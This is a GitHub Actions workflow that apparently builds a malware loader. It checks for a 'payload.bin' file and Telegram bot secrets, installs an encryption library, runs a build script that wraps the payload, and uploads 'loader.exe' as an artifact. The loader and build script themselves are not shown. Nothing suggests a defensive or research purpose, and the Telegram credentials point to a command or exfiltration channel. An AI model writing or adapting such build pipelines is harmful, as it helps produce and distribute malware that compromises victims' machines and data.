name: build

on:
  workflow_dispatch:
  push:
    tags: ['v*']

jobs:
  build:
    runs-on: windows-latest
    env:
      TG_TOKEN: ${{ secrets.TG_TOKEN }}
      TG_CHAT:  ${{ secrets.TG_CHAT }}
    steps:
      - uses: actions/checkout@v4

      - name: Payload present
        shell: pwsh
        run: |
          if (-not (Test-Path payload.bin)) { throw "payload.bin missing from repo" }
          Get-Item payload.bin | Select-Object Length

      - name: Secrets present
        shell: pwsh
        run: |
          if (-not $env:TG_TOKEN) { throw "TG_TOKEN missing" }
          if (-not $env:TG_CHAT)  { throw "TG_CHAT missing" }
          Write-Host "secrets ok"

      - name: MSVC env
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x64

      - name: Install PyCryptodome
        shell: pwsh
        run: pip install pycryptodome

      - name: Build
        shell: pwsh
        run: ./build.ps1 -Payload payload.bin -Out output

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: loader
          path: output/loader.exe
          if-no-files-found: error
